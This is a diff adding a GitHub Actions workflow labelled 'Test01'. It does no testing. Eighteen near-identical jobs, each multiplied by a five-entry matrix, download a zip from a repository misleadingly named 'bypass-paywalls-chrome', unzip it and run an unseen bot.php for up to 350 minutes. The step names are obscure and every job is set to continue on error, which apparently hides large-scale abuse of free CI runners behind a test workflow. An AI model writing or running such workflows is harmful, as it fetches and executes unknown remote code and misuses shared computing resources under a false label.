@@ -1,0 +1,266 @@
+# This is a basic workflow to help you get started with Actions
+
+# This is a basic workflow to help you get started with Actions
+
+# ------------------------------------ #
+#       Made By An V.1.0.0           #
+# ------------------------------------ #
+name: Test01
+# ------------------------------------ #
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+# ------------------------------------ #
+jobs:
+  metso:
+    runs-on: ubuntu-20.04
+    continue-on-error: True
+    strategy:
+      matrix:
+        testi: [1.1, 27, 278, 2v, 9e, 93h, os, yys,]
+        flaga: [Aqw, his, ]
+    steps:
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runneyr_go
+      run: |
+        sudo apt update -y && sleep 5
+        
+  roart-cont-1:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [1, 3, 5, 7, 9]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+      
+  roart-cont-2:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [2, 4, 6 , 8 ,9]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+            
+  roart-cont-3:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [3, 9 , 12, 15, 18]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+      
+  roart-cont-4:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [4, 8, 12, 16, 20]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+            
+  roart-cont-5:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [5, 10, 15, 20, 25]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+  
+  roart-cont-6:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [6, 12, 18, 24, 30]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+  
+  roart-cont-7:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [7, 14, 21, 28, 35]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+            
+  roart-cont-8:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [8, 16, 24, 32, 40]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+
+  roart-cont-9:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [9, 18, 27, 36, 45]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+              
+  roart-cont-10:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [10, 20, 30, 40, 50]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php            
+  
+  roart-cont-11:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [11, 22, 33, 44 ,55]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+      
+  roart-cont-12:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [12, 24, 36, 48, 60]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+      
+  roart-cont-13:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [13, 26, 39, 52, 65]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+      
+  roart-cont-14:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [14, 28, 42, 56, 70]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+            
+  roart-cont-15:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [15, 30, 45, 60, 75]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+  
+  roart-cont-16:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [16, 32, 48, 64, 80]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+  
+  roart-cont-17:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [17, 34, 51, 68, 85]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip && timeout 350m php bot.php
+            
+  roart-cont-18:
+    needs: [metso]
+    runs-on: ubuntu-latest
+    continue-on-error: True
+    strategy:
+      matrix:
+        cont-version: [18, 36, 54, 72, 90]
+    steps:
+    - name: Checkout Code
+      uses: actions/checkout@v2
+    - name: EBroo iam .
+      run: sudo apt-get update && sudo apt install php -y && mkdir mko && cd mko && wget https://github.com/Tamisv2/bypass-paywalls-chrome/raw/master/mul.zip && unzip mul.zip  && timeout 350m php bot.php
+
+  
